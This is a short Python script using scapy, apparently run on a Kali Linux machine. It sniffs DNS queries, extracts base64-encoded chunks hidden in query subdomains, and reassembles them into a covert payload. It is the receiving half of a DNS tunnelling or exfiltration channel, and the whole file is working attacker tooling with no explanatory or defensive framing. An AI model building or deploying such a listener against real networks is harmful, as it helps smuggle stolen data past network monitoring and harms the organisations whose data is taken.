# Script to Reassemble DNS Covert Payload on Kali VM

from scapy.all import *
import base64

# List to store received payload chunks
received_chunks = []

# Function to handle incoming DNS packets
def dns_sniffer(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # If it's a DNS query (qr == 0)
        query_name = packet.getlayer(DNS).qd.qname.decode().strip('.')
        print(f"Received query: {query_name}")
        
        # Extract the data chunk from the subdomain (first part of the query name)
        data_chunk = query_name.split('-')[1].split('.')[0]
        try:
            # Decode the chunk (assuming base64 encoded data)
            decoded_chunk = base64.urlsafe_b64decode(data_chunk + '==').decode()
            received_chunks.append(decoded_chunk)
        except Exception as e:
            print(f"Failed to decode chunk: {data_chunk}, error: {e}")

        # Print the current reassembled payload
        reassembled_payload = ''.join(received_chunks)
        print(f"Reassembled Payload so far: {reassembled_payload}")

# Start sniffing DNS packets on the Kali VM
if __name__ == "__main__":
    print("Starting DNS sniffer to reassemble covert payload...")
    sniff(filter="udp port 53", prn=dns_sniffer)